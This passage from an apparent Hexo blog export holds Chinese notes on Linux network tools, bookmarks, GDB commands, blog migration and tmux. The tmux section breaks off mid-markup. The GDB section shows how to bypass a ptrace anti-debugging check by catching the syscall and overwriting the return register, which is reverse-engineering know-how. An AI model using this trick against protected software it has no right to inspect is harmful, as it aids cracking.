title="1.4、网络性能工具"></a>1.4、网络性能工具</h3><ul><li>吞吐量（BPS）：<ul><li><code>sar</code>：可以查看网络接口的网络吞吐量；</li><li><code>nethogs</code>：可以查看进程的网络吞吐量；</li><li><code>iftop</code>：可以查看IP地址的网络吞吐量；</li><li><code>/proc/net/dev</code>：常用于监控；</li></ul></li><li>吞吐量（PPS）：<ul><li><code>sar</code>：注意使用 sar -n DEV 选项；</li><li><code>/proc/net/dev</code>：</li></ul></li><li>网络连接数：<ul><li><code>netstat</code>：</li><li><code>ss</code>：速度更快；</li></ul></li><li>网络错误数：<ul><li><code>netstat</code>：注意使用 netstat -s 选项；</li><li><code>sar</code>：注意使用 sar -n EDEV&#x2F;EIP 选项；</li></ul></li><li>网络延迟：<ul><li><code>ping</code>：基于ICMP；</li><li><code>hping3</code>：基于TCP协议；</li></ul></li><li>连接跟踪数：<ul><li><code>conntrack</code>：可用于查看所有连接跟踪数的详细信息；</li><li><code>/proc/sys/net/netfilter/nf_conntrack_count</code>：显示连接跟踪的数量；</li><li><code>/proc/sys/net/netfilter/nf_conntrack_max</code>：限制总的连接跟踪的数量；</li></ul></li><li>路由：<ul><li><code>mtr</code>：用于排查和定位网络链路中的路由问题；</li><li><code>traceroute</code>：用于排查和定位网络链路中的路由问题；</li><li><code>route</code>：用于查询路由表；</li></ul></li><li>DNS：<ul><li><code>dig</code>：用于排查DNS的解析问题；</li><li><code>nslookup</code>：用于排查DNS的解析问题；</li></ul></li><li>防火墙和NAT：<ul><li><code>iptables</code>：用于排查防火墙及NAT的问题；</li></ul></li><li>网卡选项：<ul><li><code>ethtool</code>：用于查看和配置网络接口的功能选项；</li></ul></li><li>网络抓包：<ul><li><code>tcpdump</code>：服务中使用tcpdump抓包；</li><li><code>wireshark</code>：图形界面分析抓包的数据；</li></ul></li><li>动态追踪：<ul><li><code>ftrace</code>：用于跟踪内核函数的调用栈；</li><li><code>bcc</code>：用于跟踪内核或应用程序的执行过程（要求内核版本&gt;&#x3D;4.1）；</li><li><code>systemtap</code>：用于跟踪内核或应用程序的执行过程；</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站收藏列表</title>
      <link href="/2018/11/27/store-website/"/>
      <url>/2018/11/27/store-website/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网站分类列表"><a href="#一、网站分类列表" class="headerlink" title="一、网站分类列表"></a>一、网站分类列表</h2><h3 id="1-1、推荐技术类网站"><a href="#1-1、推荐技术类网站" class="headerlink" title="1.1、推荐技术类网站"></a>1.1、推荐技术类网站</h3><ul><li><a href="https://www.tuicool.com/mags">编程狂人周刊</a></li><li><a href="https://weekly.manong.io/issues/">码农周刊</a></li><li><a href="https://toutiao.io/">开发者头条-今日头条</a></li><li><a href="http://mysql.taobao.org/monthly/">阿里-数据库内核月报</a></li><li><a href="http://jm.taobao.org/">阿里-中间件团队博客</a></li><li><a href="https://tech.meituan.com/">美团技术团队</a></li><li><a href="http://blogs.360.cn/">360核心安全技术博客</a></li></ul><h3 id="1-2、设计类网站"><a href="#1-2、设计类网站" class="headerlink" title="1.2、设计类网站"></a>1.2、设计类网站</h3><ul><li><a href="https://www.iconfont.cn/plus">Icon-阿里巴巴矢量图标库</a></li><li><a href="https://www.easyicon.net/">Easyicon图标下载</a></li><li><a href="http://www.akuziti.com/">艺术字体在线生成</a></li></ul><h3 id="1-3、在线工具"><a href="#1-3、在线工具" class="headerlink" title="1.3、在线工具"></a>1.3、在线工具</h3><ul><li><a href="https://tool.lu/">在线工具箱</a></li><li><a href="http://tool.chinaz.com/">站长工具</a></li><li><a href="http://www.atool9.com/">ATOOL在线工具</a></li><li><a href="https://www.processon.com/">ProcessOn在线流程图</a></li><li><a href="https://tool.lu/coderunner/">在线编程工具</a></li><li><a href="https://www.uupoop.com/">搞定设计-在线PS</a></li><li><a href="https://www.remove.bg/">图片背景抠除</a></li></ul><h3 id="1-4、阅读类"><a href="#1-4、阅读类" class="headerlink" title="1.4、阅读类"></a>1.4、阅读类</h3><ul><li><a href="https://sspai.com/">少数派</a></li><li><a href="http://www.mottoin.com/">MottoIN-专注于互联网信息安全的科技媒体</a></li><li><a href="https://www.infoq.cn/">InfoQ</a></li></ul><h3 id="1-5、搜索-x2F-导航类"><a href="#1-5、搜索-x2F-导航类" class="headerlink" title="1.5、搜索&#x2F;导航类"></a>1.5、搜索&#x2F;导航类</h3><ul><li><a href="https://www.jiumodiary.com/">鸠摩搜书-电子书搜索引擎</a></li><li><a href="https://duckduckgo.com/">DuckDuckGo 一款不追踪你的搜索引擎</a></li><li><a href="https://cn.bing.com/">Bing搜索</a></li><li><a href="https://www.anquanquan.info/">安全圈-信息安全导航页</a></li></ul><h3 id="1-6、国内镜像站"><a href="#1-6、国内镜像站" class="headerlink" title="1.6、国内镜像站"></a>1.6、国内镜像站</h3><ul><li><a href="https://pkg.phpcomposer.com/">PHPComposer</a></li><li><a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站</a></li></ul><h3 id="1-7、在线学习"><a href="#1-7、在线学习" class="headerlink" title="1.7、在线学习"></a>1.7、在线学习</h3><ul><li><a href="http://www.hetianlab.com/">合天网安实验室</a></li></ul><h3 id="1-8、其他工具"><a href="#1-8、其他工具" class="headerlink" title="1.8、其他工具"></a>1.8、其他工具</h3><ul><li><a href="http://assrt.net/">射手网(伪)字幕下载</a></li><li>[Archive网站历史记录查询](</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB使用笔记</title>
      <link href="/2018/11/26/gdb-tools/"/>
      <url>/2018/11/26/gdb-tools/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h1><p>GDB是一个由GNU开源组织发布的、UNIX&#x2F;LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。 对于一名Linux下工作的c++程序员，gdb是必不可少的工具；</p><h1 id="二、-gdb基本指令介绍"><a href="#二、-gdb基本指令介绍" class="headerlink" title="二、 gdb基本指令介绍"></a>二、 gdb基本指令介绍</h1><h2 id="2-1-gdb交互命令"><a href="#2-1-gdb交互命令" class="headerlink" title="2.1 gdb交互命令"></a>2.1 gdb交互命令</h2><ul><li><p><code>start</code>：开始调试；</p></li><li><p><code>n</code>：一条一条的执行；</p></li><li><p><code>backtrace/bt</code>：查看函数调用栈帧；</p></li><li><p><code>info/i locals</code>：查看当前栈帧局部变量；</p></li><li><p><code>frame/f</code>：选择栈帧，在查看局部变量；</p></li><li><p><code>print/p</code>：打印变量的值；</p></li><li><p><code>finish</code>：运行到当前函数返回；</p></li><li><p><code>set var sum=0</code>：修改变量的值；</p></li><li><p><code>list/l 行号或函数名</code>：列出源码；</p></li><li><p><code>display/undisplay sum</code>：每次停下显示变量的值&#x2F;取消跟踪；</p></li><li><p><code>x/7b input</code>：打印存储器内容，b–每个字节一组，7–7组；</p></li><li><p><code>disassemble</code>：反汇编当前函数或指定函数；</p></li><li><p><code>si</code>：一条指令一条指令调试 而 s 是一行一行代码；</p></li><li><p><code>info registers</code>：显示所有寄存器的当前值；</p></li><li><p><code>x/20 $esp</code>：查看内存中开始的20个数；</p></li><li><p><code>run(简写r)</code>：其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令;</p></li><li><p><code>continue(简写c)</code>：继续执行，到下一个断点处（或运行结束）;</p></li><li><p><code>next(简写n)</code>：单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，<br>而 next 则直接调用函数，不会进入到函数体内;</p></li><li><p><code>step(简写s)</code>：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的;</p></li><li><p><code>until</code>：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体;</p></li><li><p><code>until+行号</code>： 运行至某行，不仅仅用来跳出循环;</p></li><li><p><code>finish</code>： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息;</p></li><li><p><code>call函数(参数)</code>：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55);</p></li><li><p><code>quit</code>：简记为 q ，退出gdb;</p></li></ul><h2 id="2-2-设置断点"><a href="#2-2-设置断点" class="headerlink" title="2.2 设置断点"></a>2.2 设置断点</h2><ul><li><code>break n(简写b n)</code>:在第n行处设置断点（可以带上代码路径和代码名称： <code>b OAGUPDATE.cpp:578</code>）;<ul><li>continue&#x2F;c：连续运行；</li></ul></li><li><code>b fn1 if a＞b</code>：条件断点设置，满足条件才激活断点；</li><li><code>break func(break缩写为b)</code>：在函数func()的入口处设置断点，如：<code>break cb_button</code>；</li><li>b 匿名空间名::函数名<code>：对匿名空间设置断点，当匿名空间存在名称时，使用例如，</code>b Foo::foo&#96;;</li><li><code>b (anonymous namespace)::函数名</code>：对匿名空间设置断点，当匿名空间无名称时，使用例如，<code>b (anonymous namespace)::bar</code>；</li><li><code>b *address</code>：在程序地址上打断点，当调试汇编程序时，我们可以在程序地址上进行打断点，例如，<code>b *0x400522</code>；</li><li><code>b *address</code>：在程序入口处打断点，如果不知道程序的入口地址，可以使用<code>readelf -h a.out </code>指令获取程序的入口地址，例如<code>b *0x400440</code>；</li><li><code>b *func</code>：在函数的第一条汇编指令处打断点，通常我们使用<code>b func</code>打断点，但是这样并不会设置在汇编层次函数的开头，如果要将断点设置在汇编指令层次的开头，需要使用该指令；</li><li><code>delete 断点号n</code>：删除第n个断点；</li><li><code>disable 断点号n</code>：暂停第n个断点；</li><li><code>enable 断点号n</code>：开启第n个断点；</li><li><code>clear 行号n</code>：清除第n行的断点；</li><li><code>info b(info/i breakpoints)</code>：显示当前程序的断点设置情况；</li><li><code>delete breakpoints</code>：清除所有断点；</li></ul><h2 id="2-3-查看源代码"><a href="#2-3-查看源代码" class="headerlink" title="2.3 查看源代码"></a>2.3 查看源代码</h2><ul><li><code>list</code>：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行;</li><li><code>list 行号</code>：将显示当前文件以“行号”为中心的前后10行代码，如：list 12;</li><li><code>list 函数名</code>：将显示“函数名”所在函数的源代码，如：list main;</li><li><code>list</code>：不带参数，将接着上一次 list 命令的，输出下边的内容;</li></ul><h2 id="2-4-打印表达式"><a href="#2-4-打印表达式" class="headerlink" title="2.4 打印表达式"></a>2.4 打印表达式</h2><ul><li><p><code>print表达式</code>：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用;</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> ++a：将把整数 a 中的值加1,并显示出来</span><br><span class="line"><span class="built_in">print</span> name：将显示 name 的值</span><br><span class="line"><span class="built_in">print</span> gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数</span><br></pre></td></tr></table></figure></li><li><p><code>display 表达式</code>：在单步运行时将非常有用，使用<code>display</code>命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： <code>display a</code>;</p></li><li><p><code>watch表达式</code>：设置一个监视点，一旦被监视的“表达式”的值改变，<code>gdb</code>将强行终止正在被调试的程序。如： <code>watch a</code>;</p></li><li><p><code>whatis</code> ：查询变量或函数;</p></li><li><p><code>info function</code>： 查询函数;</p></li><li><p><code>info locals</code>： 显示当前堆栈页的所有变量;</p></li></ul><h2 id="2-5-查询运行信息"><a href="#2-5-查询运行信息" class="headerlink" title="2.5 查询运行信息"></a>2.5 查询运行信息</h2><ul><li><code>where/bt</code> ：当前运行的堆栈列表；</li><li><code>bt backtrace</code>：显示当前调用堆栈;</li><li><code>up/down</code> ：改变堆栈显示的深度;</li><li><code>set args 参数</code>：指定运行时的参数;</li><li><code>show args</code>：查看设置好的参数;</li><li><code>info program</code>： 来查看程序的是否在运行，进程号，被暂停的原因;</li></ul><h2 id="2-6-分割窗口"><a href="#2-6-分割窗口" class="headerlink" title="2.6 分割窗口"></a>2.6 分割窗口</h2><ul><li><code>layout</code>：用于分割窗口，可以一边查看代码，一边测试：</li><li><code>layout src</code>：显示源代码窗口</li><li><code>layout asm</code>：显示反汇编窗口</li><li><code>layout regs</code>：显示源代码&#x2F;反汇编和CPU寄存器窗口</li><li><code>layout split</code>：显示源代码和反汇编窗口</li><li><code>Ctrl + L</code>：刷新窗口</li></ul><h2 id="2-7-调试正在运行进程"><a href="#2-7-调试正在运行进程" class="headerlink" title="2.7 调试正在运行进程"></a>2.7 调试正在运行进程</h2><ul><li><code>gdb -args ./a.out a b c</code></li><li><code>gdb attach PID</code>：调试正在运行的进程；</li><li><code>gdb -q a PID</code>:调试正在运行的进程；</li><li><code>info thread</code>：查看当前进程的线程信息；</li></ul><h2 id="2-8-更强大的工具"><a href="#2-8-更强大的工具" class="headerlink" title="2.8 更强大的工具"></a>2.8 更强大的工具</h2><p>cgdb可以看作gdb的界面增强版,用来替代gdb的 gdb -tui。<br>cgdb主要功能是在调试时进行代码的同步显示，这无疑增加了调试的方便性，<br>提高了调试效率。界面类似vi，符合unix&#x2F;linux下开发人员习惯;如果熟悉gdb和vi，<br>几乎可以立即使用cgdb。</p><h1 id="三、-其他使用方式"><a href="#三、-其他使用方式" class="headerlink" title="三、 其他使用方式"></a>三、 其他使用方式</h1><h2 id="3-1-直接执行函数"><a href="#3-1-直接执行函数" class="headerlink" title="3.1 直接执行函数"></a>3.1 直接执行函数</h2><ul><li><code>call func()</code>：直接调用函数执行</li><li><code>print func()</code>：直接调用函数执行</li></ul><h2 id="3-2-设置catchpoint"><a href="#3-2-设置catchpoint" class="headerlink" title="3.2 设置catchpoint"></a>3.2 设置catchpoint</h2><ul><li><p><code>catch exec</code>：可以用<code>catch exec</code>命令为<code>exec</code>系列系统调用设置<code>catchpoint</code>(目前只有HP-UX和GNU&#x2F;Linux支持这个功能)；</p></li><li><p><code>catch fork</code>：可以用<code>catch fork</code>命令为<code>fork</code>调用设置<code>catchpoint</code>(目前只有HP-UX和GNU&#x2F;Linux支持这个功能)；</p></li><li><p><code>catch vfork</code>：可以用<code>catch vfork</code>命令为<code>vfork</code>调用设置<code>catchpoint</code>；</p></li></ul><h2 id="3-3-通过为ptrace调用设置catchpoint破解anti-debugging的程序"><a href="#3-3-通过为ptrace调用设置catchpoint破解anti-debugging的程序" class="headerlink" title="3.3 通过为ptrace调用设置catchpoint破解anti-debugging的程序"></a>3.3 通过为ptrace调用设置catchpoint破解anti-debugging的程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>                                                                      </span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Gdb is debugging me, exit.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No debugger, continuing\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有些程序不想被gdb调试，它们就会在程序中调用“<code>ptrace</code>”函数，一旦返回失败，就证明程序正在被gdb等类似的程序追踪，所以就直接退出。以上面程序为例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x400508: file a.c, line 6.</span><br><span class="line">Starting program: /data2/home/nanxiao/a</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at a.c:6</span><br><span class="line">6                       <span class="keyword">if</span> (ptrace(PTRACE_TRACEME, 0, 0, 0) &lt; 0 ) &#123;</span><br><span class="line">(gdb) n</span><br><span class="line">7                               <span class="built_in">printf</span>(<span class="string">&quot;Gdb is debugging me, exit.\n&quot;</span>);</span><br><span class="line">(gdb)</span><br><span class="line">Gdb is debugging me, <span class="built_in">exit</span>.</span><br><span class="line">8                               <span class="built_in">return</span> 1;</span><br></pre></td></tr></table></figure><p>破解这类程序的办法就是为<code>ptrace</code>调用设置<code>catchpoint</code>，通过修改<code>ptrace</code>的返回值，达到目的。仍以上面程序为例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) catch syscall ptrace</span><br><span class="line">Catchpoint 2 (syscall <span class="string">&#x27;ptrace&#x27;</span> [101])</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /data2/home/nanxiao/a</span><br><span class="line"></span><br><span class="line">Catchpoint 2 (call to syscall ptrace), 0x00007ffff7b2be9c <span class="keyword">in</span> ptrace () from /lib64/libc.so.6</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Catchpoint 2 (returned from syscall ptrace), 0x00007ffff7b2be9c <span class="keyword">in</span> ptrace () from /lib64/libc.so.6</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$rax</span> = 0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">No debugger, continuing</span><br><span class="line">[Inferior 1 (process 11491) exited normally]</span><br></pre></td></tr></table></figure><p>可以看到，通过修改<code>rax</code>寄存器的值，达到修改返回值的目的，从而让gdb可以继续调试程序（打印“<code>No debugger, continuing</code>”）。</p><h2 id="3-4-改变字符串的值"><a href="#3-4-改变字符串的值" class="headerlink" title="3.4 改变字符串的值"></a>3.4 改变字符串的值</h2><ul><li><code>set 函数::变量</code>：可以用<code>set 函数::变量</code>命令改变字符串的值，例如<code>set main::arr=&quot;Tom&quot;</code>；</li><li><code>set &#123;变量详情&#125; 变量地址 = &quot;Tom&quot;</code>：可以通过访问内存地址的方法改变字符串的值，例如<code>set &#123;char [4]&#125; 0x80477a4 = &quot;Ace&quot;</code>；</li></ul><h2 id="3-5-配置gdb-init文件"><a href="#3-5-配置gdb-init文件" class="headerlink" title="3.5 配置gdb init文件"></a>3.5 配置gdb init文件</h2><p>当gdb启动时，会读取HOME目录和当前目录下的的配置文件，执行里面的命令。这个文件通常为“.gdbinit”。</p><p>这里给出了本文档中介绍过的，可以放在“.gdbinit”中的一些配置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印STL容器中的内容</span></span><br><span class="line">python</span><br><span class="line">import sys</span><br><span class="line">sys.path.insert(0, <span class="string">&quot;/home/xmj/project/gcc-trunk/libstdc++-v3/python&quot;</span>)</span><br><span class="line">from libstdcxx.v6.printers import register_libstdcxx_printers</span><br><span class="line">register_libstdcxx_printers (None)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存历史命令</span></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">history</span> filename ~/.gdb_history</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">history</span> save on</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出时不显示提示信息</span></span><br><span class="line"><span class="built_in">set</span> confirm off</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照派生类型打印对象</span></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">print</span> object on</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印数组的索引下标</span></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">print</span> array-indexes on</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每行打印一个结构体成员</span></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">print</span> pretty on</span><br></pre></td></tr></table></figure><h2 id="3-6-设置源文件查找路径"><a href="#3-6-设置源文件查找路径" class="headerlink" title="3.6 设置源文件查找路径"></a>3.6 设置源文件查找路径</h2><ul><li><code>directory /data1/dir/</code>：在调试中使用该指令指定源文件的查找目录，避免找不到源文件的位置；</li><li><code>gdb -q a.out -d /search/code/some </code>：启动时也可以使用<code>-d</code>参数加载<code>code</code>的位置；</li></ul><h2 id="3-7-自动反汇编后面要执行的代码"><a href="#3-7-自动反汇编后面要执行的代码" class="headerlink" title="3.7 自动反汇编后面要执行的代码"></a>3.7 自动反汇编后面要执行的代码</h2><ul><li><code>set disassemble-next-line on</code>：要在任意情况下反汇编后面要执行的代码，之后使用start；</li><li><code>set disassemble-next-line auto</code>：在后面的代码没有源码的情况下才反汇编后面要执行的代码，之后使用start；</li><li><code>set disassemble-next-line off</code>：关闭自动反汇编后面要执行的代码，之后使用start指令；</li></ul><h2 id="3-8-显示程序原始机器码"><a href="#3-8-显示程序原始机器码" class="headerlink" title="3.8 显示程序原始机器码"></a>3.8 显示程序原始机器码</h2><ul><li>disassemble &#x2F;r functionName：用16进制形式显示函数的原始机器码；</li></ul><h2 id="3-9-显示将要执行的汇编指令"><a href="#3-9-显示将要执行的汇编指令" class="headerlink" title="3.9 显示将要执行的汇编指令"></a>3.9 显示将要执行的汇编指令</h2><ul><li>display &#x2F;i $pc：显示当程序停止时，将要执行的汇编指令，可用于显示在断点之后的即将要执行的汇编指令；</li></ul><h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><ul><li><a href="https://www.kancloud.cn/itfanr/i-100-gdb-tips/81864">为系统调用设置catchpoint</a></li><li><a href="https://www.kancloud.cn/itfanr/i-100-gdb-tips/81851">100-gdb-tips</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Tools </tag>
            
            <tag> Notes </tag>
            
            <tag> GDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客转移至GitHub Pages</title>
      <link href="/2018/11/25/github-pages-hexo/"/>
      <url>/2018/11/25/github-pages-hexo/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>已经很久没有写博客了，加上毕业之后腾讯云以及阿里云的一些针对学生的服务器优惠政策已经没法使用了，并且刚开始工作的资金比较紧张，在前段时候腾讯云的服务器过期之后，自己也没再续费，只是把域名续费了，把之前写的一些文章导出保存了下来，想着有精力的时候再拾起来，转眼之间，2018年已经快过去了，也是时候该整了一下了。</p><p>使用了很久的<code>Ghost</code>，对它的各种使用都很欣赏，也很感谢它培养了我的<code>Markdown</code>的写作习惯，但是需要花费一些金钱上的精力去维护一个自留地，多少成为了我逐渐放弃<code>Ghost</code>的原因；转移到<code>GitHub Pages</code>上很大的原因还是不需要去维护自己的服务器，只是去简单的记录，没有多余的担心，这一点比<code>Ghost</code>好了很多；自己博客上的文章倒是没有多少，但是的确是跟了自己很多年的心血，带着自己的当初的努力与骄傲。</p><h2 id="二、博客迁移"><a href="#二、博客迁移" class="headerlink" title="二、博客迁移"></a>二、博客迁移</h2><ul><li>GitHub Pages + Hexo + Melody Theme</li><li>Disqus</li><li>微博图床 + 七牛云 + URL替换脚本</li><li>百度统计 + Google Analytics</li></ul><h2 id="三、GitHub-Pages-Hexo-Melody-Theme"><a href="#三、GitHub-Pages-Hexo-Melody-Theme" class="headerlink" title="三、GitHub Pages + Hexo + Melody Theme"></a>三、GitHub Pages + Hexo + Melody Theme</h2><p><code>GitHub Pages</code>是面向用户、组织和项目开放的公共静态页面搭建托管服 务，站点可以被免费托管在 <code>Github</code> 上，你可以选择使用<code> Github Pages</code> 默认提供的域名 <code>*.github.io</code>或者自定义域名来发布站点。</p><p><code>Hexo</code>（<a href="https://hexo.io/zh-cn/docs/">Hexo官网 - 文档</a>）是一个快速、简洁且高效的博客框架。<code>Hexo</code> 使用 <code>Markdown</code>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p><code>Melody</code>是<code>Hexo</code>的一个比较好用的模板，配置项简洁明了，模板的整体风格比较清新（感觉Hexo的整体的模板风格都是挺不错的）。</p><h2 id="四、Disqus"><a href="#四、Disqus" class="headerlink" title="四、Disqus"></a>四、Disqus</h2><p>之前博客中主流的评论组件可能就是多说了，在之前使用<code>Ghost</code>的时候我也是使用的多说的评论组件，但是无奈多说的业务转型，要放弃评论组件了，之前在使用<code>Ghost</code>的时候曾经转而使用过畅言等其他插件，其实也就那个样，各家的缺点优点对于我这种访问评论量不大的站点来说没什么不同，之所以尝试去使用<code>Disqus</code>很大的一方面还是模板中原生支持该组件，配置较为简单，体验也还OK。</p><h2 id="五、微博图床-七牛云-URL替换脚本"><a href="#五、微博图床-七牛云-URL替换脚本" class="headerlink" title="五、微博图床 + 七牛云 + URL替换脚本"></a>五、微博图床 + 七牛云 + URL替换脚本</h2><p>图床的作用不言而喻，刚开始写博客的时候就关注了一些图床，比如七牛云，又拍云以及微博图床等，目前我使用的就是七牛云+微博图床（之前的一些封面图在微博图床，因此目前迁移过来后仍在使用）。</p><h2 id="六、百度统计-Google-Analytics"><a href="#六、百度统计-Google-Analytics" class="headerlink" title="六、百度统计 + Google Analytics"></a>六、百度统计 + Google Analytics</h2><p>我这站点也没啥流量啦，仅用了记录，不过就看使用后的感觉来说，也能获得不少有趣的消息；</p>]]></content>
      
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> GitHub Pages </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tmux使用记录</title>
      <link href="/2018/11/25/tmux/"/>
      <url>/2018/11/25/tmux/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Tmux是Linux中一款终端窗口复用的工具。对比与iTerm来说，iTerm只是作为一款GUI软件，在一个窗口中只能显示一个Shell的内容，但是Tmux却可以在一个窗口中显示多个Shell内容；对比与Screen来说，Screen是GNU 软件，而 Tmux 使用的是 BSD 协议，最为重要的是 Tmux 支持 Vi&#x2F;Emacs 风格的键盘映射，更好的接口和文档，以及更好的脚本控制。</p><h2 id="二、基本概念"><a href="#二、基本概念" class="headerlink" title="二、基本概念"></a>二、基本概念</h2><p>Tmux的主要元素分为三层：</p><ul><li><code>Session</code> ：一组窗口的集合，通常用来概括同一个任务，可以设置不同的名字以便于任务之间的切换；</li><li><code>Window</code>： 单个可见窗口，Window有自己的编号，也可以认为和 iTerm2 中的 Tab 类似；</li><li><code>Pane</code>： 窗格，被划分成小块的窗口，类似于 Vim 中 C-w +v 后的效果；</li></ul><p><img src="https://cdn.bugwz.com/concept.jpg" alt="Tmux概念设计"></p><h2 id="三、安装与使用"><a href="#三、安装与使用" class="headerlink" title="三、安装与使用"></a>三、安装与使用</h2><h3 id="3-1、安装"><a href="#3-1、安装" class="headerlink" title="3.1、安装"></a>3.1、安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install tmux       <span class="comment"># OSX</span></span><br><span class="line">pacman -S tmux          <span class="comment"># archlinux</span></span><br><span class="line">apt-get install tmux    <span class="comment"># Ubuntu</span></span><br><span class="line">yum install tmux        <span class="comment"># Centos</span></span><br></pre></td></tr></table></figure><h3 id="3-2、基本操作"><a href="#3-2、基本操作" class="headerlink" title="3.2、基本操作"></a>3.2、基本操作</h3><h4 id="3-2-1、信息查询"><a href="#3-2-1、信息查询" class="headerlink" title="3.2.1、信息查询"></a>3.2.1、信息查询</h4><ul><li><code>tmux list-keys</code> 列出所有可以的快捷键和其运行的 tmux 命令</li><li><code>tmux list-commands</code> 列出所有的 tmux 命令及其参数</li><li><code>tmux info</code> 流出所有的 session, window, pane, 运行的进程号，等。</li></ul><h4 id="3-2-2、未进入Tmux的操作"><a href="#3-2-2、未进入Tmux的操作" class="headerlink" title="3.2.2、未进入Tmux的操作"></a>3.2.2、未进入Tmux的操作</h4><ul><li><code>session 会话</code>：session是一个特定的终端组合，输入tmux就可以打开一个新的session<ul><li><code>tmux new -s session_name</code> 创建一个叫做 <code>session_name</code> 的 tmux session</li><li><code>tmux attach -t session_name</code> 重新开启叫做 <code>session_name</code> 的 tmux session</li><li><code>tmux switch -t session_name</code> 转换到叫做 <code>session_name</code> 的 tmux session</li><li><code>tmux list-sessions</code> &#x2F; <code>tmux ls</code> 列出现有的所有 session</li><li><code>tmux detach</code> 离开当前开启的 session</li><li><code>tmux kill-server</code> 关闭所有 session</li></ul></li><li><code>window 窗口</code>：session 中可以有不同的 window（但是同时只能看到一个 window）<ul><li><code>tmux new-window</code> 创建一个新的 window</li><li><code>tmux list-windows</code></li><li><code>tmux select-window -t :0-9</code> 根据索引转到该 window</li><li><code>tmux rename-window</code> 重命名当前 window</li></ul></li><li><code>pane 面板</code>：window 中可以有不同的 pane（可以把 window 分成不同的部分）<ul><li><code>tmux split-window</code> 将 window 垂直划分为两个 pane</li><li><code>tmux split-window -h</code> 将 window 水平划分为两个 pane</li><li><code>tmux swap-pane -[UDLR]</code> 在指定的方向交换 pane</li><li><code>tmux select-pane -[UDLR]</code> 在指定的方向选择下一个 pane</li></ul></li></ul><h4 id="3-2-3、进入Tmux的操作"><a href="#3-2-3、进入Tmux的操作" class="headerlink" title="3.2.3、进入Tmux的操作"></a>3.2.3、进入Tmux的操作</h4><p>常用的是在 tmux 中直接通过默认前缀 <code>ctrl + b</code> 之后输入对应命令来操作，具体如下：</p><h5 id="3-2-3-1、基本操作"><a href="#3-2-3-1、基本操作" class="headerlink" 